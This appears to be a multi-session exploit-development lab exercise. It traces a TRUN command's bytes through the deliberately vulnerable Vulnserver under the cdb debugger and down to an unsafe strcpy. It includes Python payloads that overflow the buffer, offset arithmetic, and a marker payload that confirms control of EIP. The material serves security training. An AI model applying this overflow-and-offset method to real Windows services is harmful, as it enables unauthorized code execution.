# Exercise 02 — Tracing input through Vulnserver

The cornerstone exercise. Plan on three sessions, 60 minutes each, on separate
days. Do not try to do all of them in one sitting — sleeping between sessions
is part of the learning.

## The question

Trace a single byte of attacker input from the moment `recv()` returns to the
moment EIP is overwritten. Name every function the data passes through. For
each function, describe what it does to your data and what it leaves on the
stack.

By the end you should be able to draw the complete data path on paper from
memory.

## Why this question

Almost every Windows stack overflow has the same shape:

```
network arrival -> dispatch -> handler -> unsafe copy -> overflow
```

Sync Breeze, Easy File Sharing, SLMail, and dozens of other classic
targets follow this pattern. Once you have traced TRUN end to end, every one
of those becomes a variation rather than a new mystery. You're not learning
TRUN. You're learning *the pattern*.

## Setup

Launch vulnserver under cdb, with no script:

```
cdb.exe -o -G C:\path\to\vulnserver.exe
```

From a second terminal you'll be sending payloads with a Python one-liner.
Keep that terminal open across all three sessions. You'll go back and forth.

## Session 1 — Where does the data arrive?

**Duration: 60 minutes.**

### Step 1.1 — Break on `recv` and observe the call chain

```
0:000> bp ws2_32!recv
0:000> g
```

Send a small TRUN payload from your Python terminal:

```python
import socket
s = socket.create_connection(("vulnserver_ip", 9999))
s.recv(1024)
s.sendall(b"TRUN /.:/AAAA\r\n")
s.close()
```

When the breakpoint fires, run:

```
0:003> k
```

**Predict before you look:** how many frames will you see, and what do you
expect each one to be?

You should see roughly:

```
 # ChildEBP RetAddr
00 ...      ws2_32!recv
01 ...      vulnserver+0x1958
02 ...      KERNEL32!BaseThreadInitThunk
03 ...      ntdll!__RtlUserThreadStart
04 ...      ntdll!_RtlUserThreadStart
```

The interesting frame is `01`. The return address `vulnserver+0x1958` is the
instruction *after* the `call ws2_32!recv` inside vulnserver. That means the
function containing that call is vulnserver's connection handler — the
function that owns the per-connection buffer.

### Step 1.2 — Find the connection handler

`ub` disassembles backward from an address. Use it to find the `call recv`
that's currently in flight, plus the dozen or so instructions before it:

```
0:003> ub vulnserver+0x1958 20
```

(`20` is hex — that's 32 instructions backward. Adjust as needed.)

Read the output. Look for:

- The `call ws2_32!recv` itself.
- The `push` instructions that placed `recv`'s arguments on the stack.
  `recv(sock, buf, len, flags)` is a 4-argument function, so you'll see
  four `push` instructions before the `call`.
- A `lea reg, [ebp-NNN]` or similar that computed the buffer's address
  before pushing it.

**Question:** What is the offset (relative to `ebp`) of the buffer that
`recv` is filling? Write the answer in your notes.

**Verification:** at the breakpoint inside `recv`, the arguments are still on
the stack. Inside `recv`, the call has pushed a return address (the
`vulnserver+0x1958` you already saw). So `[esp]` is the ret addr, `[esp+4]`
is `sock`, `[esp+8]` is `buf`, `[esp+0xc]` is `len`, `[esp+0x10]` is `flags`.

Look:

```
0:003> dd esp L6
```

The third value (offset `+8`) is the buffer address. The fourth (offset
`+0xc`) is the maximum length. Confirm both look sane (a stack-ish address
for the buffer, a reasonable size like `0x1000` or so for the length).

### Step 1.3 — Let recv finish and look at the buffer

```
0:003> bp ws2_32!recv "gu; .echo recv-returned"
```

Actually no — `gu` inside a bp command will hit the same problem you found
earlier with execution inside an event handler. Instead, just step out
manually:

```
0:003> gu
```

You're now back in vulnserver, just after `recv` returned. Confirm `eip`:

```
0:003> r eip
```

It should equal the return address from the call chain you saw earlier
(`vulnserver+0x1958` or whatever your build shows).

Now look at the buffer:

```
0:003> db <buffer-addr> L20
```

You should see `TRUN /.:/AAAA` in ASCII. **That's your data, in
vulnserver's address space, written by the network stack.** The byte you sent
has arrived. Now you need to find out where it goes next.

### Session 1 — checkpoint

By the end of this session you should be able to answer, in your notes:

1. What is the return address from `recv` to the calling function in
   vulnserver?
2. What is the offset of the receive buffer relative to `ebp` (or `esp`) of
   that function?
3. How big is the buffer?
4. What is the absolute address of the buffer in memory right now?

Do the writeup before continuing. Mention what surprised you.

---

## Session 2 — Where does the data go next?

**Duration: 60 minutes.**

### Step 2.1 — Set up a clean breakpoint on the connection handler entry

You know `recv` was called from somewhere inside the function whose return
address from `recv` was `vulnserver+0x1958`. The function itself starts
somewhere *before* that — usually a few dozen instructions earlier.

Find the function entry. The simplest way: `uf` if you know the symbol
(you don't, vulnserver is stripped), or `ub` with a large count and look for
the prologue:

```
0:003> ub vulnserver+0x1958 80
```

Read backward (top of the output is earlier in memory). Look for the
characteristic function prologue:

```
push ebp
mov  ebp, esp
sub  esp, NNN
```

The address of that `push ebp` is the function entry. Note it. Call this
`F_recv_handler` in your notes (it's the function that receives data on a
connection).

### Step 2.2 — Step through the dispatch

Restart vulnserver under cdb (the previous run is in an inconsistent state
after the connection drop). Set a breakpoint at `F_recv_handler`:

```
0:000> bp <address-of-push-ebp>
0:000> g
```

Send a TRUN payload again. When the breakpoint fires, you are at the entry
of the connection handler. Now **single-step** through the function with `p`:

```
0:000> p
```

Repeat. Watch:

- When does `recv` get called? (You'll see `call ws2_32!recv`.)
- After `recv`, where does the buffer's contents get inspected? (Look for
  `cmp` or `strncmp`-like patterns.)
- When the code decides "this is a TRUN command," where does it jump or call
  to?

**The pattern you're looking for:** the connection handler reads bytes,
checks the first few characters against known command names (TRUN, STATS,
RTIM, etc.), and `call`s a different function per command.

When you see the `call` that handles TRUN specifically, note its target
address. Call this `F_trun` in your notes.

If you lose your place stepping, set a breakpoint somewhere ahead and `g` to
it. Don't waste 20 minutes single-stepping through a strncmp loop. The point
is to find the structural waypoints, not to watch every iteration.

### Step 2.3 — Confirm F_trun is what you think it is

Restart again. Set a breakpoint on `F_trun`:

```
0:000> bp <F_trun>
0:000> g
```

Send a TRUN payload. The breakpoint should fire only for TRUN, not for
STATS or other commands. Verify by sending a STATS payload (`b"STATS\r\n"`)
and confirming the breakpoint *doesn't* fire. Then send TRUN again and
confirm it does.

When `F_trun` fires, look at the stack:

```
0:000> dd esp L4
```

`[esp]` is the return address — back into the connection handler. `[esp+4]`
and beyond are arguments to `F_trun`. One of those arguments should be a
pointer to the user-supplied buffer (the data after `TRUN `).

Confirm:

```
0:000> db poi(esp+4) L20
```

You should see your TRUN argument bytes. If you see something else, the
argument layout is different from what you guessed — figure out which
argument carries the buffer.

### Session 2 — checkpoint

In your notes, draw the data path so far:

```
network --> recv() --> buffer at [F_recv_handler ebp - X]
                            |
                            v
                  F_recv_handler dispatches on TRUN
                            |
                            v
                  F_trun(arg1=buffer, ...)
```

The next session takes it one more step: from F_trun into the unsafe copy.

---

## Session 3 — Where does the crash actually happen?

**Duration: 60–90 minutes.**

### Step 3.1 — Step through F_trun until you find the strcpy

You already know (from earlier work) that vulnserver's TRUN handler calls
`strcpy` at `vulnserver+0x1821`. This session is about *verifying* that and
understanding **why** that strcpy is the crash.

Set a breakpoint at the call site, not at strcpy itself:

```
0:000> bp vulnserver+0x1821
0:000> g
```

Send a TRUN payload large enough to overflow:

```python
s.sendall(b"TRUN /.:/" + b"A" * 5000 + b"\r\n")
```

When the breakpoint fires, you are at the `call strcpy` instruction. The
stack already has both arguments pushed:

```
0:000> dd esp L2
```

`[esp]` = destination, `[esp+4]` = source.

### Step 3.2 — Examine the destination buffer

```
0:000> db poi(esp) L20
```

You'll see uninitialized memory (likely zeros, or remnants of previous
calls). That's the destination buffer *before* the copy.

Then look at where the destination is relative to the frame's `ebp`:

```
0:000> ? poi(esp) - ebp
```

This gives you the offset of the destination buffer from `ebp` in
`F_trun`'s frame. It will be a negative number — locals live at negative
offsets from `ebp`.

Note this offset. Call it `BUF_OFFSET`.

### Step 3.3 — Examine the source buffer

```
0:000> db poi(esp+4) L40
```

You'll see `TRUN /.:/AAAA...` — your input. This is the data that's about
to be copied unchecked into the destination.

### Step 3.4 — Walk through the strcpy

Step over the `call strcpy`:

```
0:000> p
```

The strcpy has now executed. The destination buffer has been overwritten
with thousands of `A`s, including bytes past the destination buffer's actual
size — which means past the saved `ebp` and past the saved return address.

Verify:

```
0:000> r
```

Note `eip`. If you're still in vulnserver (post-strcpy, pre-ret), great.

Now look at where the return address *should* be:

```
0:000> dd ebp+4 L1
```

That's `0x41414141`. You have overwritten the return address with `A`s.
You haven't crashed yet because the function hasn't `ret`'d. Step until it
does:

```
0:000> p
```

A few more `p`'s and you'll hit the `ret`. The instant the `ret`
executes, `eip` becomes `0x41414141` and the next instruction fetch
faults. You see your crash.

```
0:000> r
eax=...
eip=41414141
```

### Step 3.5 — Math the offset from first principles

In `F_trun`'s frame, the layout is:

```
ebp + 0x08    argument 2 (if any)
ebp + 0x04    saved return address    <-- you need to overwrite this
ebp + 0x00    saved ebp                <-- and this
ebp - 0x04    local var 1
...
ebp - BUF_OFFSET   destination buffer  <-- strcpy writes here, grows upward
```

To reach the saved return address, you need to write exactly:

```
abs(BUF_OFFSET) + 4 (saved ebp) + 0 = abs(BUF_OFFSET) + 4 bytes
```

Wait — read that again. The destination buffer is at `ebp - BUF_OFFSET`
(where BUF_OFFSET is, say, `0x7d0`). The saved ebp is at `ebp + 0`. The
return address is at `ebp + 4`.

From the *start* of the buffer to the saved return address is:

```
ebp + 4  -  (ebp - 0x7d0)  =  0x7d0 + 4  =  0x7d4
```

So `0x7d4` bytes of filler will put your next 4 bytes exactly on top of the
saved return address. Write that number down. Call it `OFFSET_TO_EIP`.

### Step 3.6 — Verify with a real payload

Send a payload with a recognizable marker exactly at OFFSET_TO_EIP:

```python
prefix = b"TRUN /.:/"
filler = b"A" * OFFSET_TO_EIP
marker = b"BBBB"
tail   = b"C" * 100
s.sendall(prefix + filler + marker + tail + b"\r\n")
```

Crash and check:

```
0:000> r eip
eip=42424242
```

If `eip` is exactly `0x42424242`, your offset math is correct and you have
fully understood the vulnerability. If it's not, the BUF_OFFSET you derived
in step 3.2 is wrong — go back and recalculate.

### Session 3 — checkpoint

In your notes:

1. The complete data path: network -> recv -> connection handler ->
   F_trun -> strcpy -> destination buffer -> overflows into saved ebp ->
   overflows into saved return address.
2. The address of every function in that chain.
3. The exact offset from the start of attacker-controlled data to the saved
   return address.
4. A drawing of F_trun's stack frame on paper.

---

## Final writeup

Open the notes template. Write a single document called
*"How a TRUN packet becomes EIP control."* It should be readable by another
student who hasn't done this exercise. Include:

- A diagram of the call chain
- A diagram of F_trun's stack frame, with addresses
- The exact instruction at vulnserver+0x1821 and why it's the bug
- The offset math from first principles
- The verification payload and how you confirmed it worked

If you can write this without re-opening the debugger, the model has stuck.

## What the model lets you do now

You can take any Windows daemon, attach the debugger, and answer:

- Which function handles a connection?
- Where does my input land in memory?
- What does the program do with it next?
- Is there an unsafe copy in the path?
- If so, what's the offset from input start to saved return address?

That's the entire first half of OSED-style exploit development. The other
half is what you do *with* EIP control — Module 02.
